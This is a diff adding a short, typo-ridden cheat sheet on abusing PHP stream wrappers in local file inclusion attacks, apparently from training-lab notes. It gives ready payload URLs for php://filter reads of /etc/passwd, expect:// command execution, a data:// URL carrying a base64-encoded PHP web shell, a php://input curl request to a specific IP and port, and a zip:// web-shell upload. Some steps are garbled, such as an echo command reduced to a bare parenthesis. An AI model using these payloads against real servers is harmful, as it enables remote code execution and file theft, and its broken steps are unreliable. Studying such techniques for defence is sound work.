@@ -1,1 +1,44 @@
+PHP WRAPPERS
+Sometimes server preappends .php extension with resources being fetched by server ,so we can make use of php filter wrapper which sends required eqest as base64 and recieves it in base64 .if we have to get source of index.php we can get it by using this filter and giving the resource parameter as index. Index source can give us more info about structure of blacklisting and server and then we can further craft our payloads as we desire
+
+    when normal lfi doesnt return output,then we can use this and we will get our output in base64.
+    http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
+
+php://filter/read=convert.base64-encode/resource=/etc/passwd PHP filter to convert file contents to Base64
+php://filter/read=string.rot13/resource=/etc/passwd PHP filter to convert file contents to ROT13
+
+    expect://id Command execution with PHP Expect wrapper
+
+we can directly use expect wrapper to execute commands
+    http:/example.com/index.php?param=expect://id
+
+    We can also try data wrapper which allows us to include our own code from external source
+we have to encode the code we want to execute on server side in base64. In following example we encoded php web get shell in base64
+
+Allow_url_include must be enabled
+
+    http://blog.inlanefreight.com/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
+    php://input input wrapper is also like data wrapper and we can include this in lfi parameter
+
+we input our php get shell in body area of the request as its the data we are sending to server and we use ?param=php://include&cmd=ls in our request
+
+we can do it with curl
+
+    curl -s -X POST --data "" "http://134.209.184.216:30084/index.php?language=php://input"
+
+    php zip://
+
+we can use this to interact a zip file on server
+
+If we can upload zip files then we a upload a zip including our php get web shell and
+
+    echo ")" > exec.php
+    zip malicious.zip exec.php
+
+we upload the malicious.zip on website
+
+zip wrapper allows to include the files inside a zip file and thus we can interact with exec.php and add a cmd parameter executing our commands
+http://example.com/index.php?language=zip://malicious.zip%23exec.php&cmd=id
+
+files inside a zip are referenced with a # sign but we have to url encode it in our request which is %23
 
